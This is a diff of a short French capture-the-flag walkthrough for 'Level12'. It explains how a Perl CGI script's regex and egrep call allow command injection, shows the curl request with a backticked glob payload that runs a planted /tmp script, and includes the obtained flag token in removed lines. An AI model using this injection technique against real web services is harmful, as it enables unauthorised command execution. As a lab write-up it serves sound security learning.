@@ -1,15 +1,28 @@
-executer un executable dans le egrep du fichier .pl 
+# Level12
 
-executable:
+---
 
-    SCRIPT: 
-        #!/bin/bash
-        getflag > /tmp/flag
+- Nous avons un script perl dans le home.
 
-executer la command 
+- En analysant le regex, on observe que le parametre seras mis en majuscules et tout les characteres suivant le premier espace (inclus) serons supprimer.
 
-    curl localhost:4646?x='`/*/SCRIPT`'
+- La string transformee passe ensuite dans un egrep que l'on vas par la suite exploiter.
 
-lire le ficher /tmp/flag est vous obtenez le flag
+- Nous devons ensuite creer un script dans le /tmp/SCRIPT:
+```bash
+#!/bin/bash
+getflag > /tmp/flag
+```
 
-    2A31L79asukciNyi8uppkEuSx
+```bash
+chmod +x /tmp/SCRIPT
+```
+
+
+- On execute la commande: 
+
+```bash
+curl localhost:4646?x='`/*/SCRIPT`'
+```
+
+- Puis on lis le ficher /tmp/flag.
